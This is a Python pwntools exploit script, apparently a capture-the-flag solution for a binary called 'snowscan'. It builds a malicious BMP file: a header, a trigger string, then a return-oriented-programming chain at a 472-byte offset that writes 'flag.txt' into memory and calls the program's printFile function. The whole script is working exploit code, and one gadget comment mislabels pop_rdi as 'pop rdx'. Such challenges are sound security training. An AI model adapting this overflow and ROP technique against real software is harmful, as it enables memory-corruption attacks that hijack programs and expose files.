#!/usr/bin/env python3
from pwn import *

bmpfile = 'exploit.bmp'

elf = context.binary = ELF('./snowscan', checksec=True)
context(terminal=['tmux', 'split-window', '-h'])
context.log_level = 'info'

gs = '''
unset environment LINES
unset environment COLUMNS
unset environment TERM_PROGRAM
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path, bmpfile], gdbscript=gs, *a, **kw)
    else:
        return process([elf.path, bmpfile], *a, **kw)

def generate_bmp_file():
    # BMP file header
    signature = b'BM'
    fileSize = 0
    reserved = 0
    dataOffset = 54
    headerSize = 0
    width = 20  # Adjust the width within the acceptable range
    height = 20  # Adjust the height within the acceptable range
    colorPlanes = 0
    bitsPerPixel = 0
    compression = 0
    imageSize = 400
    horizontalResolution = 0
    verticalResolution = 0
    numColors = 0
    importantColors = 0

    bmp_header = signature + fileSize.to_bytes(4, 'little') + reserved.to_bytes(4, 'little') + \
        dataOffset.to_bytes(4, 'little') + headerSize.to_bytes(4, 'little') + width.to_bytes(4, 'little') + \
        height.to_bytes(4, 'little') + colorPlanes.to_bytes(2, 'little') + bitsPerPixel.to_bytes(2, 'little') + \
        compression.to_bytes(4, 'little') + imageSize.to_bytes(4, 'little') + \
        horizontalResolution.to_bytes(4, 'little') + verticalResolution.to_bytes(4, 'little') + \
        numColors.to_bytes(4, 'little') + importantColors.to_bytes(4, 'little')

    trigger = b"3nk1's-n4m-shub"

    flag_str = 0x4c3500

    # Gadgets:
    pop_rax = 0x4522e7  # pop rax; ret;
    pop_rdi = 0x401a72  # pop rdx; ret; 
    pop_rsi = 0x40f97e  # pop rsi; ret; 
    pop_rdx = 0x40197f  # pop rdx; ret; 
    syscall = 0x41eb64  # syscall; ret;
    ret = 0x40101a  # ret;

    gadget = 0x482d35  # mov qword ptr [rsi], rax ; ret
    
    offset = 472
    payload = flat({
        offset: [
            pop_rax,
            b"flag.txt",
            pop_rsi,
            flag_str,
            gadget,
            pop_rdi,
            flag_str,
            elf.sym.printFile,
            0xc0debabe
        ]
    })

    bmp_data = bmp_header + trigger + payload

    # Save the data to a file
    with open(bmpfile, 'wb') as f:
        f.write(bmp_data)

if __name__=='__main__':
    generate_bmp_file()

    io = start()
    io.interactive()
